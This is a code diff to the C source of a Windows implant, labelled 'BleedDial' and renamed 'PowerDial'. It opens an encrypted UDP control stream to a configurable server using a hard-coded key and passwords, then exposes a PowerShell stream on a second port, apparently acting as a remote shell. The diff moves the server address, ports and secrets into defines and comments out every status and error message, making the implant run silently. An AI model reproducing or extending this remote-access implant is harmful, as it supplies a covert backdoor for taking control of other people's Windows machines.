@@ -7,13 +7,24 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
+
+//Make sure that the information is between quotes.
+#define SERVER_IP "127.0.0.1"
+#define SERVER_PORT "9999"
+#define LOCAL_PORT "7777"
+
+#define ENCRYPTION_KEY "lets learn about IELR(1) parser generators"
+#define CTRL_STREAM_PASSWD "badapple1998"
+#define PWSH_STREAM_PASSWD "cardstock's mom"
+
+
 void init_winsock() {
-    printf("Initiallizing Winsock...\n");
+    //printf("Initiallizing Winsock...\n");
     WSADATA wsa_data;
     int startup_result = WSAStartup(MAKEWORD(2, 2), &wsa_data);
 
     if (startup_result != 0) {
-        perror("Unable to initialize Winsock!\n");
+        //perror("Unable to initialize Winsock!\n");
         exit(-1);
     }
 }
@@ -27,21 +38,21 @@ void setup_socket(SOCKET* sock) {
     hints.ai_family = AF_INET;
     hints.ai_socktype = SOCK_DGRAM;
     hints.ai_protocol = IPPROTO_UDP;
-    int addr_info_res = getaddrinfo("127.0.0.1", "7777", &hints, &res);
+    int addr_info_res = getaddrinfo("127.0.0.1", LOCAL_PORT, &hints, &res);
     if (addr_info_res != 0) {
-        perror("Invaid address!\n");
+        //perror("Invaid address!\n");
         exit(-1);
     }
 
     *sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
     if (*sock == INVALID_SOCKET) {
-        perror("Invalid socket!");
+        //perror("Invalid socket!");
         exit(-1);
     }
 
     int bind_result = bind(*sock, res->ai_addr, (int)res->ai_addrlen);
     if (bind_result == SOCKET_ERROR) {
-        perror("Unable to bind socket!");
+        //perror("Unable to bind socket!");
         exit(-1);
     }
 
@@ -53,20 +64,20 @@ void setup_tremont(SOCKET* sock, Tremont_Nexus** nexus) {
 
     res = tremont_init_nexus(nexus);
     if (res != 0) {
-        perror("Unable to initialize Tremont nexus!");
+        //perror("Unable to initialize Tremont nexus!");
         exit(-1);
     }
 
-    char key[] = "lets learn about IELR(1) parser generators";
+    char key[] = ENCRYPTION_KEY;
     res = tremont_key_nexus(key, sizeof(key), *nexus);
     if (res != 0) {
-        perror("Unable to key Tremont nexus!");
+        //perror("Unable to key Tremont nexus!");
         exit(-1);
     }
 
     res = tremont_bind_nexus(*sock, *nexus);
     if (res != 0) {
-        perror("Unable to bind Tremont nexus!");
+        //perror("Unable to bind Tremont nexus!");
         exit(-1);
     }
 }
@@ -80,9 +91,9 @@ struct addrinfo* get_remote_addrinfo() {
     remote_hint.ai_family = AF_INET;
     remote_hint.ai_socktype = SOCK_DGRAM;
     remote_hint.ai_protocol = IPPROTO_UDP;
-    int addr_info_res = getaddrinfo("127.0.0.1", "9999", &remote_hint, &remote_info);
+    int addr_info_res = getaddrinfo(SERVER_IP, SERVER_PORT, &remote_hint, &remote_info);
     if (addr_info_res != 0) {
-        perror("Invaid remote address!\n");
+        //perror("Invaid remote address!\n");
         exit(-1);
     }
 
@@ -174,7 +185,7 @@ void _cleanup_powershell(struct powershell_info* info) {
 void implant_powershell(Tremont_Nexus* nexus) {
     int res = -1;
 
-    char password[] = "cardstock's mom";
+    char password[] = PWSH_STREAM_PASSWD;
     tremont_auth_stream(7777, password, sizeof(password), nexus);
 
     res = tremont_accept_stream(7777, 0, nexus);
@@ -228,7 +239,7 @@ void implant_powershell(Tremont_Nexus* nexus) {
 }
 
 int main() {
-    printf("BleedDial Implant v0.0\n");
+    //printf("PowerDial Implant v0.0\n");
 
     init_winsock();
 
@@ -240,13 +251,13 @@ int main() {
 
     tremont_set_size(300, nexus);
 
-    char password[] = "badapple1998";
+    char password[] = CTRL_STREAM_PASSWD;
     tremont_auth_stream(9999, password, sizeof(password), nexus);
 
     struct addrinfo* remote_addrinfo = get_remote_addrinfo();
     tremont_req_stream(9999, remote_addrinfo->ai_addr, 0, nexus);
     freeaddrinfo(remote_addrinfo);
-    printf("Control stream established!\n");
+    //printf("Control stream established!\n");
 
     implant_powershell(nexus);
 
